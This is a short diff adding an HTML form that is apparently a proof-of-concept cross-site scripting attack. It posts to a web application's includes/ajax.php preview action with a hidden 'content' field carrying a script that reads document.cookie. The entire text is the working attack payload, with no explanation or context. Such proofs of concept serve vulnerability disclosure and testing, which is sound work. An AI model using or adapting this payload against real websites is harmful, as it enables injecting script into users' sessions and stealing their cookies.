@@ -1,0 +1,7 @@
+<form action="http://[host]/includes/ajax.php" method="post">
+<input type="hidden" name="action" value="preview" />
+<input type="hidden" name="feather" value="" />
+<input type="hidden" name="field" value="" />
+<input type="hidden" name="content" value='<script>alert(document.cookie);</script>' />
+<input type="submit" id="btn"> 
+</form>
